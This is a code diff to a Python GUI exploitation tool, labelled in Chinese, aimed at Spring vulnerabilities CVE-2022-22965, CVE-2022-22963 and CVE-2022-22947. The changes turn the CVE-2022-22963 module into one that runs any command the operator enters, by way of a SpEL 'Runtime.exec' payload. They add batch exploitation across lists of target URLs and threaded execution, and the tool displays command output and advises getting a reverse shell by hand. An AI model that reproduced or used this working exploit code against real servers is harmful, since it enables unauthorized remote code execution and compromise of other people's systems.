@@ -90,7 +90,7 @@ class RootFrom:
         # 漏洞利用控件
         self.reverse_tcp = tk.Entry(self.root)
         self.reverse_tcp.place(x=150,y=260)
-        self.reverse_tcp.insert(0,"仅支持CVE-2022-22965")
+        self.reverse_tcp.insert(0,"whoami")
         self.CVEs = ttk.Combobox(self.root,width=18)
         self.CVEs['value'] = cves
         self.CVEs.current(0)
@@ -695,7 +695,7 @@ class RootFrom:
             with open("vuleLogs.log","a") as f:
                 f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                 f.write("\n")
-    def CVE_2022_22965_Exec(self):
+    def cve_2022_22965_exec(self):
         url = self.rank.get()
         if url != "":
             title = "================CVE_2022_2296命令执行================"
@@ -719,7 +719,8 @@ class RootFrom:
             try:
                 r = requests.get(url_shell)
                 resp = r.text
-                result = re.findall('([^\x00]+)\n', resp)#[0]
+                #result = re.findall('([^\x00]+)\n', resp)[0]
+                result = resp
             except urllib3.util.ssl_match_hostname.CertificateError:
                 result = "[-] CVE_2022_2296命令执行 请求错误"
             except urllib3.exceptions.MaxRetryError:
@@ -736,14 +737,20 @@ class RootFrom:
                     f.write("\n")
         else:
             messagebox.showinfo("提示","存在漏洞地址不能为空！")
-    def CVE_2022_22963(self, url, proxies):
+    def CVE_2022_22965_Exec(self):
+        try:
+            threadVule = Thread(target=self.cve_2022_22965_exec)
+            threadVule.start()
+        except KeyboardInterrupt:
+            messagebox.showinfo('Info','interrupted by user, killing all threads...')
+    def CVE_2022_22963(self, url, proxies, execcmd):
         title = "================开始对目标URL进行CVE-2022-22963漏洞利用================"
         self.info_text.insert(tk.INSERT,title)
         self.info_text.insert(tk.INSERT, '\n')
         tar = '[+]target ' + url
         self.info_text.insert(tk.INSERT,tar)
         self.info_text.insert(tk.INSERT, '\n')
-        payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
+        payload = 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(execcmd)
         ua = self.uas()
         data = 'test'
         header = {
@@ -764,11 +771,12 @@ class RootFrom:
                 req = requests.post(url=url, headers=header, data=data, verify=False, timeout=6)
             code = req.status_code
             text = req.text
-        
             rsp = '"error":"Internal Server Error"'
-
             if code == 500 and rsp in text:
                 back = f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell'
+                self.info_text.insert(tk.INSERT,back)
+                self.info_text.insert(tk.INSERT, '\n')
+                back = '[+] 命令执行成功' + text
                 self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
             else:
@@ -871,20 +879,24 @@ class RootFrom:
         if url == "":
             messagebox.showinfo("提示","漏洞地址不能为空(且只能选一种模式)！")
         elif isinstance(url,list) == True:
-            for i in url:
-                i = i.strip("\n")
-                if ('://' not in i):
-                    i = str("http://") + str(i)
-                if str(i[-1]) != "/":
-                    i = i +  "/"
-                url_proxy = self.url_proxy_get(input_url)
-                proxies = url_proxy[-1]
-                if Vule == "CVE-2022-22965":
-                    self.CVE_2022_22965(i, proxies)
-                elif Vule == "CVE-2022-22963":
-                    self.CVE_2022_22963(i, proxies)
-                elif Vule == "CVE-2022-22947":
-                    self.CVE_2022_22947(i, proxies)
+            if execcmd == "":
+                messagebox.showinfo("提示","批量运行执行命令不能为空！")
+            else:   
+                for i in url:
+                    i = i.strip("\n")
+                    if ('://' not in i):
+                        i = str("http://") + str(i)
+                    if str(i[-1]) != "/":
+                        i = i +  "/"
+                    url_proxy = self.url_proxy_get(input_url)
+                    proxies = url_proxy[-1]
+                    if Vule == "CVE-2022-22965":
+                        self.CVE_2022_22965(i, proxies)
+                    elif Vule == "CVE-2022-22963":
+                        execcmd = self.reverse_tcp.get()
+                        self.CVE_2022_22963(i, proxies,execcmd)
+                    elif Vule == "CVE-2022-22947":
+                        self.CVE_2022_22947(i, proxies)
         else:
             url = url.strip("\n")
             if ('://' not in url):
@@ -894,7 +906,11 @@ class RootFrom:
             if Vule == "CVE-2022-22965":
                 self.CVE_2022_22965(url, proxies)
             elif Vule == "CVE-2022-22963":
-                self.CVE_2022_22963(url, proxies)
+                execcmd = self.reverse_tcp.get()
+                if execcmd == "":
+                    messagebox.showinfo("提示","执行命令不能为空,请重试！")
+                else:
+                    self.CVE_2022_22963(url, proxies,execcmd)
             elif Vule == "CVE-2022-22947":
                 self.CVE_2022_22947(url, proxies)
         back = "[+]漏洞扫描完成"
